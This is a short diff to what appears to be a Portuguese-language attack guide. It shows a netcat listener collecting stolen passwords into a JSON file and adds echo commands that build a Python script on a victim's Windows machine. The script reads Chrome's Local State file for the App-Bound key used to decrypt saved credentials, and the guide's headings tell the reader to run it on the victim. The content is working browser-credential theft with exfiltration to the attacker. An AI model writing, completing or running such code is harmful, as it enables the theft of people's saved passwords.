@@ -270,6 +270,10 @@ nc -lvnp 9999 | tee passwords_full.json
 ### No shell da vitima
 ``` cmd
 echo import os, sqlite3, shutil, tempfile, socket, subprocess, json, base64 > %TEMP%\final_v2.py
+echo. >> %TEMP%\final_v2.py
+echo # Lê a chave App-Bound do Local State >> %TEMP%\final_v2.py
+echo local_state_path = os.environ['LOCALAPPDATA'] + r'\Google\Chrome\User Data\Local State' >> %TEMP%\final_v2.py
+
 ```
 
 ### Depois rode na vitima
